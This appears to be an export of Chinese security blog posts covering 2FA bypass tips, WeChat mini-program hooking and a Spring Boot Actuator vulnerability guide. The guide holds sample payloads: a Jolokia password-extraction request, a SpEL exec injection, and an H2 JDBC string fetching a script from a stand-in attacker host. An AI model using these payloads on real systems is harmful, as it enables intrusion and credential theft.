<h5 id="–-第二因素不授权"><a href="#–-第二因素不授权" class="headerlink" title="–!第二因素不授权"></a>–!第二因素不授权</h5><p>即有缺陷的双因素验证逻辑</p>
<p>有些应用你登录了就会给token，其他第二因素认证就是一个前端，直接绕过就行</p>
<h5 id="–-token本身存在越权"><a href="#–-token本身存在越权" class="headerlink" title="–!token本身存在越权"></a>–!token本身存在越权</h5><p>例如cookie本身可解密，且包含用户信息，例如解密后，user&#x3D;test，直接改成user&#x3D;admin</p>
<hr>
<p><u>小技巧</u></p>
<p>bp中存在session，可用用宏跑规定的请求包，替换session以保证服务正常运行，turbo intuder可用自定义python爆破</p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>article</tag>
      </tags>
  </entry>
  <entry>
    <title>关于微信的渗透</title>
    <url>/2025/06/13/%E5%85%B3%E4%BA%8E%E5%BE%AE%E4%BF%A1%E7%9A%84%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h1 id="rpc连接"><a href="#rpc连接" class="headerlink" title="rpc连接"></a>rpc连接</h1><h2 id="1-wxdevtools-jsrpc"><a href="#1-wxdevtools-jsrpc" class="headerlink" title="1.wxdevtools+jsrpc"></a>1.wxdevtools+jsrpc</h2><p>强开devtools限定小程序为8555</p>
<p>使其他文件“只读”，则微信只能使用8555</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">icacls &quot;C:\TestFolder&quot; /deny <span class="variable">%username%</span>:W</span><br></pre></td></tr></table></figure>

<p>利用websock，直接跑参数，可忽略加密</p>
<p>注：小程序默认只支持wss，可能还限制域名</p>
<h2 id="2-工具-taro-wxtool-jsrpc"><a href="#2-工具-taro-wxtool-jsrpc" class="headerlink" title="2.工具&#x2F;taro-wxtool+jsrpc"></a>2.工具&#x2F;taro-wxtool+jsrpc</h2><p>注意：报错 _typeof3 is not a function</p>
<span id="more"></span> 

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span><span class="string">` `</span><span class="title function_">_typeof2</span>(<span class="params">o</span>) &#123;</span><br><span class="line">  <span class="string">``</span><span class="string">&quot;@babel/helpers - typeof&quot;</span><span class="string">``</span>;</span><br><span class="line">  <span class="string">``</span><span class="keyword">return</span><span class="string">` `</span>(_typeof2 = <span class="string">``</span><span class="string">&quot;function&quot;</span><span class="string">` `</span>== <span class="string">``</span><span class="keyword">typeof</span><span class="string">` `</span><span class="title class_">Symbol</span> &amp;&amp; <span class="string">``</span><span class="string">&quot;symbol&quot;</span><span class="string">` `</span>== <span class="string">``</span><span class="keyword">typeof</span><span class="string">` `</span><span class="title class_">Symbol</span>.<span class="property">iterator</span> ? <span class="string">``</span><span class="keyword">function</span><span class="string">``</span>(o) &#123;</span><br><span class="line">      <span class="string">``</span><span class="keyword">return</span><span class="string">` `</span><span class="keyword">typeof</span><span class="string">` `</span>o;</span><br><span class="line">  <span class="string">``</span>&#125; : <span class="string">``</span><span class="keyword">function</span><span class="string">``</span>(o) &#123;</span><br><span class="line">      <span class="string">``</span><span class="keyword">return</span><span class="string">` `</span>o &amp;&amp; <span class="string">``</span><span class="string">&quot;function&quot;</span><span class="string">` `</span>== <span class="string">``</span><span class="keyword">typeof</span><span class="string">` `</span><span class="title class_">Symbol</span> &amp;&amp; o.<span class="property">constructor</span> === <span class="title class_">Symbol</span> &amp;&amp; o !== <span class="title class_">Symbol</span>.<span class="property"><span class="keyword">prototype</span></span> ? <span class="string">``</span><span class="string">&quot;symbol&quot;</span><span class="string">` `</span>: <span class="string">``</span><span class="keyword">typeof</span><span class="string">` `</span>o;</span><br><span class="line">  <span class="string">``</span>&#125;)(o);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span><span class="string">` `</span><span class="title function_">_typeof</span>(<span class="params">o</span>) &#123;</span><br><span class="line">  <span class="string">``</span><span class="keyword">return</span><span class="string">` `</span><span class="string">&quot;function&quot;</span><span class="string">` `</span>== <span class="string">``</span><span class="keyword">typeof</span><span class="string">` `</span><span class="title class_">Symbol</span> &amp;&amp; <span class="string">``</span><span class="string">&quot;symbol&quot;</span><span class="string">` `</span>=== <span class="title function_">_typeof2</span>(<span class="title class_">Symbol</span>.<span class="property">iterator</span>) ? <span class="variable language_">module</span>.<span class="property">exports</span> = _typeof = <span class="string">``</span><span class="keyword">function</span><span class="string">``</span>(o) &#123;</span><br><span class="line">      <span class="string">``</span><span class="keyword">return</span><span class="string">` `</span><span class="title function_">_typeof2</span>(o);</span><br><span class="line">  <span class="string">``</span>&#125; : <span class="variable language_">module</span>.<span class="property">exports</span> = _typeof = <span class="string">``</span><span class="keyword">function</span><span class="string">``</span>(o) &#123;</span><br><span class="line">      <span class="string">``</span><span class="keyword">return</span><span class="string">` `</span>o &amp;&amp; <span class="string">``</span><span class="string">&quot;function&quot;</span><span class="string">` `</span>== <span class="string">``</span><span class="keyword">typeof</span><span class="string">` `</span><span class="title class_">Symbol</span> &amp;&amp; o.<span class="property">constructor</span> === <span class="title class_">Symbol</span> &amp;&amp; o !== <span class="title class_">Symbol</span>.<span class="property"><span class="keyword">prototype</span></span> ? <span class="string">``</span><span class="string">&quot;symbol&quot;</span><span class="string">` `</span>: <span class="title function_">_typeof2</span>(o);</span><br><span class="line">  <span class="string">``</span>&#125;, <span class="title function_">_typeof</span>(o);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = _typeof;</span><br></pre></td></tr></table></figure>



<h3 id="（2）-扩展-ngrok-jsrpc-映射"><a href="#（2）-扩展-ngrok-jsrpc-映射" class="headerlink" title="（2）.扩展  ngrok+jsrpc 映射"></a>（2）.扩展  ngrok+jsrpc 映射</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ngrok http 12080</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> demo = <span class="keyword">new</span> <span class="title class_">Hlclient</span>(<span class="string">&quot;wss://xxxxxxxxx.ngrok-free.app/ws?group=zzz&quot;</span>);</span><br></pre></td></tr></table></figure>





<h2 id="3-手机小程序调试"><a href="#3-手机小程序调试" class="headerlink" title="3.手机小程序调试"></a>3.手机小程序调试</h2><p><a href="http://debugx5.qq.com/">http://debugx5.qq.com/</a></p>
<h1 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h1><h2 id="1-js-node-server"><a href="#1-js-node-server" class="headerlink" title="1.js+node-server"></a>1.js+node-server</h2>]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>article</tag>
      </tags>
  </entry>
  <entry>
    <title>spring-boot详解</title>
    <url>/2025/06/06/spring-boot%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<blockquote>
<h1 id="一、Spring-Boot基础与安全机制"><a href="#一、Spring-Boot基础与安全机制" class="headerlink" title="一、Spring Boot基础与安全机制"></a><strong>一、Spring Boot基础与安全机制</strong></h1><h4 id="1-Spring-Boot定义"><a href="#1-Spring-Boot定义" class="headerlink" title="1. Spring Boot定义"></a>1. <strong>Spring Boot定义</strong></h4><ul>
<li><strong>核心定位</strong>：Spring Boot是Spring生态的子项目，用于简化Spring应用的初始搭建和开发流程，提供自动化配置（<code>@EnableAutoConfiguration</code>）、内嵌服务器（Tomcat&#x2F;Jetty）和Starter依赖机制。</li>
<li><strong>关键特性</strong>：<ul>
<li>无XML配置，通过<code>spring-boot-starter-*</code>依赖自动装配组件。</li>
<li>Actuator模块提供生产环境监控端点（如<code>/env</code>、<code>/health</code>），默认暴露敏感信息。</li>
</ul>
</li>
</ul>
<h4 id="2-安全机制缺陷"><a href="#2-安全机制缺陷" class="headerlink" title="2. 安全机制缺陷"></a>2. <strong>安全机制缺陷</strong></h4><ul>
<li><strong>默认暴露路由</strong>：Actuator端点未授权访问导致信息泄露。</li>
<li><strong>配置不当</strong>：开发环境配置误用于生产环境（如Swagger、Actuator未关闭）。</li>
<li><strong>依赖链风险</strong>：第三方库（如SnakeYAML、XStream）的反序列化漏洞被利用。</li>
</ul>
<span id="more"></span>

<hr>
<h3 id="二、Spring-Boot历史漏洞详解"><a href="#二、Spring-Boot历史漏洞详解" class="headerlink" title="二、Spring Boot历史漏洞详解"></a><strong>二、Spring Boot历史漏洞详解</strong></h3><h4 id="1-信息泄露类漏洞"><a href="#1-信息泄露类漏洞" class="headerlink" title="1. 信息泄露类漏洞"></a>1. <strong>信息泄露类漏洞</strong></h4><ul>
<li><strong>敏感数据暴露</strong><ul>
<li><p><strong>漏洞路径</strong>：<code>/env</code>、<code>/actuator/env</code> 泄露环境变量、数据库密码（部分脱敏字段可被绕过）16。</p>
</li>
<li><p><strong>脱敏绕过</strong>：通过Jolokia接口调用MBean获取星号（<code>******</code>）遮掩的密码明文：</p>
</li>
</ul>
</li>
</ul>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/jolokia</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-prolog">&#123;<span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;</span>, <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;getProperty&quot;</span>, <span class="string">&quot;arguments&quot;</span>: [<span class="string">&quot;security.user.password&quot;</span>]&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>接口详情泄露</strong><ul>
<li><strong>Swagger路由</strong>：<code>/v2/api-docs</code>、<code>/swagger-ui.html</code> 暴露API文档及参数。</li>
</ul>
</li>
</ul>
<h4 id="2-远程代码执行（RCE）漏洞"><a href="#2-远程代码执行（RCE）漏洞" class="headerlink" title="2. 远程代码执行（RCE）漏洞"></a>2. <strong>远程代码执行（RCE）漏洞</strong></h4><p>以下是12类核心RCE漏洞的对比与利用要点：</p>
<table>
<thead>
<tr>
<th align="left"><strong>漏洞名称</strong></th>
<th align="left"><strong>利用条件</strong></th>
<th align="left"><strong>利用方法</strong></th>
<th align="left"><strong>关键路径</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>Whitelabel Error Page SpEL</strong></td>
<td align="left">Spring Boot 1.1.0-1.3.0</td>
<td align="left">注入SpEL表达式：<code>$&#123;T(java.lang.Runtime).getRuntime().exec(&quot;id&quot;)&#125;</code></td>
<td align="left">触发错误页面的参数（如<code>?id=</code>)</td>
</tr>
<tr>
<td align="left"><strong>Spring Cloud SnakeYAML RCE</strong></td>
<td align="left">依赖<code>spring-cloud-starter</code></td>
<td align="left">设置<code>spring.cloud.bootstrap.location</code>指向恶意YAML文件</td>
<td align="left"><code>/env</code> + <code>/refresh</code></td>
</tr>
<tr>
<td align="left"><strong>Eureka XStream反序列化</strong></td>
<td align="left">使用Eureka服务发现</td>
<td align="left">修改<code>eureka.client.serviceUrl.defaultZone</code>指向恶意XStream Payload</td>
<td align="left"><code>/env</code> + <code>/refresh</code></td>
</tr>
<tr>
<td align="left"><strong>Jolokia Logback JNDI</strong></td>
<td align="left">Jolokia端点开放 + Logback依赖</td>
<td align="left">通过<code>ch.qos.logback.classic.jmx.JMXConfigurator</code>加载远程恶意XML</td>
<td align="left"><code>/jolokia</code> + <code>POST</code>请求</td>
</tr>
<tr>
<td align="left"><strong>H2 Database Console JNDI</strong></td>
<td align="left">启用H2 Console（默认<code>/h2-console</code>）</td>
<td align="left">利用JDBC URL触发JNDI注入：<code>jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3/;INIT=RUNSCRIPT FROM &#39;http://attacker/exp.sql&#39;</code></td>
<td align="left"><code>/h2-console</code>登录后的JDBC执行点</td>
</tr>
<tr>
<td align="left"><strong>MySQL JDBC反序列化</strong></td>
<td align="left">使用MySQL驱动 + 可外连</td>
<td align="left">劫持JDBC连接至恶意MySQL服务器，发送Gadget链</td>
<td align="left">修改<code>spring.datasource.url</code>属性</td>
</tr>
</tbody></table>
<blockquote>
<p>💡 <strong>利用链共性</strong>：多数RCE依赖Actuator的<code>/env</code>端点修改环境变量，并通过<code>/refresh</code>或<code>/restart</code>触发配置生效。</p>
</blockquote>
<hr>
<h3 id="三、黑盒安全评估检查清单"><a href="#三、黑盒安全评估检查清单" class="headerlink" title="三、黑盒安全评估检查清单"></a><strong>三、黑盒安全评估检查清单</strong></h3><h4 id="1-路由探测与版本识别"><a href="#1-路由探测与版本识别" class="headerlink" title="1. 路由探测与版本识别"></a>1. <strong>路由探测与版本识别</strong></h4><ul>
<li><strong>默认路由扫描</strong>：<ul>
<li>Actuator 1.x根路径：<code>/env</code>、<code>/heapdump</code>。</li>
<li>Actuator 2.x根路径：<code>/actuator/env</code>、<code>/actuator/heapdump</code>。</li>
<li>自定义路径：尝试<code>/manage</code>、<code>/appenv</code>等常见替代路径。</li>
</ul>
</li>
<li><strong>版本依赖关系</strong>：<br><strong>Spring Cloud与Boot版本兼容表</strong>：</li>
</ul>
<table>
<thead>
<tr>
<th align="left">Spring Cloud</th>
<th align="left">Spring Boot</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Edgware</td>
<td align="left">1.5.x (不兼容2.x)</td>
</tr>
<tr>
<td align="left">Finchley</td>
<td align="left">2.0.x</td>
</tr>
<tr>
<td align="left">Hoxton</td>
<td align="left">2.2.x-2.3.x</td>
</tr>
</tbody></table>
<h4 id="2-敏感端点检测"><a href="#2-敏感端点检测" class="headerlink" title="2. 敏感端点检测"></a>2. <strong>敏感端点检测</strong></h4><ul>
<li><strong>高风险端点</strong>：</li>
</ul>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">/env            # 环境变量与配置</span><br><span class="line">/jolokia/list   # 列出所有MBean</span><br><span class="line">/heapdump       # 下载堆内存快照（含敏感数据）</span><br><span class="line">/trace          # 查看HTTP请求记录（含Cookie）</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>信息泄露验证</strong>：<br>检查<code>/v2/api-docs</code>是否返回API JSON结构；访问<code>/swagger-ui.html</code>确认接口详情。</li>
</ul>
<h4 id="3-漏洞利用验证流程"><a href="#3-漏洞利用验证流程" class="headerlink" title="3. 漏洞利用验证流程"></a>3. <strong>漏洞利用验证流程</strong></h4><ol>
<li><strong>信息收集</strong>：<ul>
<li>访问<code>/env</code>搜索<code>password</code>、<code>secret</code>等关键词。</li>
<li>检查<code>******</code>字段，尝试Jolokia明文提取。</li>
</ul>
</li>
<li><strong>RCE触发</strong>：<ul>
<li>修改环境变量（如<code>spring.datasource.url</code>注入恶意JDBC）。</li>
<li>调用<code>/refresh</code>或<code>/restart</code>生效配置。</li>
</ul>
</li>
<li><strong>内存分析</strong>：<ul>
<li>下载<code>/heapdump</code>，使用MAT工具分析内存中的密码明文。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="四、防御建议"><a href="#四、防御建议" class="headerlink" title="四、防御建议"></a><strong>四、防御建议</strong></h3><ol>
<li><strong>端点管控</strong>：<ul>
<li>生产环境关闭Actuator或通过<code>management.endpoints.web.exposure.include</code>限制暴露端点。</li>
</ul>
</li>
<li><strong>依赖安全</strong>：<ul>
<li>避免使用有漏洞的组件（如XStream &lt; 1.4.17、SnakeYAML &lt; 1.31）。</li>
</ul>
</li>
<li><strong>配置加固</strong>：<ul>
<li>重命名敏感端点路径（如<code>management.endpoints.web.path-mapping.env=internal-env</code>）。</li>
<li>启用Spring Security对Actuator端点鉴权。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="五、学习资源"><a href="#五、学习资源" class="headerlink" title="五、学习资源"></a><strong>五、学习资源</strong></h3><ol>
<li><p><strong>漏洞项目</strong>：</p>
<ul>
<li><a href="https://github.com/LandGrey/SpringBootVulExploit">LandGrey&#x2F;SpringBootVulExploit</a>：含漏洞环境与PoC。</li>
</ul>
</li>
<li><p><strong>深度分析</strong>：</p>
<ul>
<li><a href="https://cloud.tencent.cn/developer/article/2278104">Spring {Boot, Data, Security}历史漏洞研究</a>：漏洞原理与调试方法。</li>
</ul>
</li>
<li><p><strong>实验环境</strong>：</p>
<ul>
<li><a href="https://github.com/vulhub/vulhub/tree/master/spring/spring-boot-actuator">vulhub&#x2F;spring-boot-actuator</a></li>
</ul>
</li>
<li><p><strong>推荐工具</strong>：</p>
<ol>
<li><h6 id="heapdump-tool"><a href="#heapdump-tool" class="headerlink" title="heapdump_tool"></a><a href="https://www.aliyundrive.com/s/GapNjP3a9Rx">heapdump_tool</a></h6></li>
<li><h6 id="SpringBoot-Scan"><a href="#SpringBoot-Scan" class="headerlink" title="SpringBoot-Scan"></a><a href="https://gitcode.com/AabyssZG/SpringBoot-Scan">SpringBoot-Scan</a></h6></li>
<li><h6 id="Swagger-API-Exploit"><a href="#Swagger-API-Exploit" class="headerlink" title="Swagger API Exploit"></a><a href="https://github.com/lijiejie/swagger-exp">Swagger API Exploit</a></h6></li>
</ol>
</li>
<li><p><strong>常见案列</strong>：</p>
<ol>
<li><a href="https://blog.csdn.net/yunli0/article/details/117817987">10个Spring Boot 优秀学习项目_springboot项目</a></li>
</ol>
</li>
</ol>
<p>此框架覆盖了Spring Boot漏洞的核心场景，从原理到实践形成闭环，可作为渗透测试和安全加固的标准化参考。</p>
</blockquote>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>article</tag>
      </tags>
  </entry>
  <entry>
    <title>Guid-v1参数</title>
    <url>/2025/06/05/Guid-v1%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="详解GUID：结构、版本与V1的安全隐患"><a href="#详解GUID：结构、版本与V1的安全隐患" class="headerlink" title="详解GUID：结构、版本与V1的安全隐患"></a>详解GUID：结构、版本与V1的安全隐患</h2><h3 id="什么是GUID？"><a href="#什么是GUID？" class="headerlink" title="什么是GUID？"></a>什么是GUID？</h3><p>GUID（全局唯一标识符）是一个128位（16字节）的唯一标识符，通常表示为32个十六进制字符（8-4-4-4-12格式）。它在分布式系统中广泛用于生成无需中央协调的唯一ID，例如数据库主键、COM对象标识等。</p>
<h3 id="GUID结构解析"><a href="#GUID结构解析" class="headerlink" title="GUID结构解析"></a>GUID结构解析</h3><p>一个标准GUID的结构如下（以V1为例）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxxxxxxx-xxxx-Mxxx-Nxxx-xxxxxxxxxxxx</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>M</strong>：版本号（V1为<code>1</code>）</li>
<li><strong>N</strong>：变体标识（通常为<code>8</code>&#x2F;<code>9</code>&#x2F;<code>A</code>&#x2F;<code>B</code>）</li>
<li><strong>时间戳</strong>：前60位（高32位 + 中16位的前12位）</li>
<li><strong>时钟序列</strong>：13-16位（M后4位 + N前2位）</li>
<li><strong>节点MAC</strong>：最后48位（后6字节）</li>
</ul>
<span id="more"></span>

<h3 id="V1-GUID的安全问题"><a href="#V1-GUID的安全问题" class="headerlink" title="V1 GUID的安全问题"></a>V1 GUID的安全问题</h3><p>V1 GUID的设计缺陷在于其包含可预测的明文信息：</p>
<ol>
<li><strong>MAC地址泄露</strong>：最后6字节直接暴露生成机器的物理地址</li>
<li><strong>时间戳可逆</strong>：前60位包含精确到100ns的生成时间（从1582年10月15日起）</li>
<li><strong>序列号可枚举</strong>：时钟序列空间仅14位（16384种可能）</li>
</ol>
<h3 id="示例代码：解析V1-GUID"><a href="#示例代码：解析V1-GUID" class="headerlink" title="示例代码：解析V1 GUID"></a>示例代码：解析V1 GUID</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> namedtuple</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义解析结果结构</span></span><br><span class="line">GUIDv1Info = namedtuple(<span class="string">&#x27;GUIDv1Info&#x27;</span>, [<span class="string">&#x27;timestamp&#x27;</span>, <span class="string">&#x27;mac&#x27;</span>, <span class="string">&#x27;clock_seq&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_guidv1</span>(<span class="params">guid_str</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;解析V1 GUID并提取敏感信息&quot;&quot;&quot;</span></span><br><span class="line">    guid = uuid.UUID(guid_str)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 验证版本</span></span><br><span class="line">    <span class="keyword">if</span> guid.version != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Not a version 1 GUID&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 提取MAC地址 (最后6字节)</span></span><br><span class="line">    mac = <span class="string">&#x27;:&#x27;</span>.join([<span class="string">f&quot;<span class="subst">&#123;guid.<span class="built_in">hex</span>[i:i+<span class="number">2</span>]&#125;</span>&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>, <span class="number">32</span>, <span class="number">2</span>)])</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 提取时钟序列 (13-16位)</span></span><br><span class="line">    clock_seq = ((guid.fields[<span class="number">3</span>] &amp; <span class="number">0x3FFF</span>) &lt;&lt; <span class="number">4</span>) | (guid.fields[<span class="number">4</span>] &gt;&gt; <span class="number">12</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 转换时间戳 (1582年起点)</span></span><br><span class="line">    base_time = datetime.datetime(<span class="number">1582</span>, <span class="number">10</span>, <span class="number">15</span>, tzinfo=datetime.timezone.utc)</span><br><span class="line">    guid_ns = (guid.time - <span class="number">0x01b21dd213814000</span>) * <span class="number">100</span></span><br><span class="line">    gen_time = base_time + datetime.timedelta(microseconds=guid_ns // <span class="number">1000</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> GUIDv1Info(timestamp=gen_time, mac=mac, clock_seq=clock_seq)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例使用</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    sample_guid = <span class="string">&quot;c232ab00-9414-11ec-b3c4-00155d3d28d0&quot;</span>  <span class="comment"># V1 GUID</span></span><br><span class="line">    info = parse_guidv1(sample_guid)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] GUID解析结果:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;生成时间: <span class="subst">&#123;info.timestamp.isoformat()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;MAC地址: <span class="subst">&#123;info.mac&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;时钟序列: <span class="subst">&#123;info.clock_seq&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="输出示例"><a href="#输出示例" class="headerlink" title="输出示例"></a>输出示例</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">[+] GUID解析结果:</span><br><span class="line">生成时间: <span class="number">2022</span>-<span class="number">02</span>-<span class="number">18</span>T08:<span class="number">15</span>:<span class="number">45</span>.<span class="number">418000</span>+<span class="number">00</span>:<span class="number">00</span></span><br><span class="line">MAC地址: <span class="number">00</span>:<span class="number">15</span>:<span class="number">5</span>d:<span class="number">3</span>d:<span class="number">28</span>:d0</span><br><span class="line">时钟序列: <span class="number">46020</span></span><br></pre></td></tr></table></figure>

<h3 id="安全建议"><a href="#安全建议" class="headerlink" title="安全建议"></a>安全建议</h3><ol>
<li><p><strong>避免使用V1</strong>：在需要隐私的场景下（如公开API、客户端ID），使用V4随机GUID</p>
</li>
<li><p><strong>敏感系统替代方案</strong>：</p>
<ul>
<li>数据库自增ID（集中式系统）</li>
<li>雪花算法（Snowflake）等时间有序但无敏感信息泄露的算法</li>
<li>ULID&#x2F;CUID等现代替代方案</li>
</ul>
</li>
<li><p><strong>必须使用时的处理</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用随机MAC替代真实MAC</span></span><br><span class="line">uuid.uuid1(node=random.getrandbits(<span class="number">48</span>) | <span class="number">0x010000000000</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="GUID版本对比"><a href="#GUID版本对比" class="headerlink" title="GUID版本对比"></a>GUID版本对比</h3><table>
<thead>
<tr>
<th align="left">版本</th>
<th align="left">描述</th>
<th align="left">安全性</th>
</tr>
</thead>
<tbody><tr>
<td align="left">V1</td>
<td align="left">基于时间+MAC</td>
<td align="left">低（信息泄露）</td>
</tr>
<tr>
<td align="left">V2</td>
<td align="left">DCE安全版本</td>
<td align="left">中（已淘汰）</td>
</tr>
<tr>
<td align="left">V3</td>
<td align="left">基于命名空间MD5</td>
<td align="left">中（可预测）</td>
</tr>
<tr>
<td align="left">V4</td>
<td align="left">完全随机</td>
<td align="left">高（推荐）</td>
</tr>
<tr>
<td align="left">V5</td>
<td align="left">基于命名空间SHA1</td>
<td align="left">高</td>
</tr>
</tbody></table>
<blockquote>
<p><strong>关键结论</strong>：V1 GUID因其设计特性导致严重的信息泄露风险，在现代系统中应优先使用V4随机GUID或其他隐私保护方案。如需时间有序ID，建议采用雪花算法等不包含敏感信息的替代方案。</p>
</blockquote>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>project</tag>
      </tags>
  </entry>
  <entry>
    <title>js排查pages和api</title>
    <url>/2025/05/30/js%E6%8E%92%E6%9F%A5pages%E5%92%8Capi/</url>
    <content><![CDATA[<h1 id="述"><a href="#述" class="headerlink" title="述"></a>述</h1><p>注：这个只是为了学习原理，更好的工具推荐是F6JO大佬的bp插件<a href="https://github.com/F6JO/JsRouteScan">JsRouteScan</a></p>
<p>或者自己访问所有链接把所有js保存到同一目录，再用正则表达式提取比较全面</p>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>通过伪造请求头，遍历所有的src跳转链接，保存所有响应为200的js放在同一目录下，用脚本遍历js，过滤出正则表达式对应的前端目录，拼接目录进行如上循环，直到连续两次路径集合相同或达到最大迭代次数，最后对js目录提取规定的正则表达式</p>
<span id="more"></span>

<p>不足：</p>
<p>仅仅对url的目录排查和哈希路由排查，后续能力提升可能会功能进行增强</p>
<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pattern_groups = &#123;</span><br><span class="line">    <span class="string">&quot;PagePath Matches&quot;</span>: [</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&#x27;pagePath:\s*&quot;(.*?)&quot;&#x27;</span>), <span class="string">&quot;pagePath_double_quotes&quot;</span>),</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&quot;pagePath:\s*&#x27;(.*?)&#x27;&quot;</span>), <span class="string">&quot;pagePath_double_quotes&quot;</span>),</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;Path Matches&quot;</span>: [</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&#x27;path:\s*&quot;(.*?)&quot;&#x27;</span>), <span class="string">&quot;path_double_quotes&quot;</span>),</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&quot;path:\s*&#x27;(.*?)&#x27;&quot;</span>), <span class="string">&quot;path_double_quotes&quot;</span>),</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&#x27;url:\s*&quot;([^&quot;]+)&quot;&#x27;</span>), <span class="string">&quot;path_double_quotes&quot;</span>),</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&#x27;url: &quot;([^&quot;]+)&#x27;</span>), <span class="string">&quot;path_double_quotes&quot;</span>),</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;GET Matches&quot;</span>: [</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&#x27;get\([^()]*?&quot;([^&quot;]*?)&quot;[^()]*?\)&#x27;</span>), <span class="string">&quot;get_double_quotes&quot;</span>),</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&quot;get\([^()]*?[&#x27;\&quot;]([^&#x27;\&quot;]*?)[&#x27;\&quot;][^()]*?\)&quot;</span>), <span class="string">&quot;get_double_quotes&quot;</span>),</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;POST Matches&quot;</span>: [</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&#x27;post\([^()]*?&quot;([^&quot;]*?)&quot;[^()]*?\)&#x27;</span>), <span class="string">&quot;post_double_quotes&quot;</span>),</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&quot;POST\([^()]*?[&#x27;\&quot;]([^&#x27;\&quot;]*?)[&#x27;\&quot;][^()]*?\)&quot;</span>), <span class="string">&quot;post_double_quotes&quot;</span>),</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>project</tag>
      </tags>
  </entry>
  <entry>
    <title>hunter批量搜索</title>
    <url>/2025/05/09/hunter%E8%AF%AD%E6%B3%95%E6%89%B9%E9%87%8F%E6%90%9C%E7%B4%A2/</url>
    <content><![CDATA[<h1 id="述"><a href="#述" class="headerlink" title="述"></a>述</h1><p>工作的时候，要求要找不同地方的同一性质的资产，为了避免麻烦，所以干脆找ai写了一个脚本，感觉蛮好用的，想着以后若是更新或者增加功能点，方便回想功能的构造，所用api为hunter，在此记录如下</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>全组合-笛卡尔积</p>
<table>
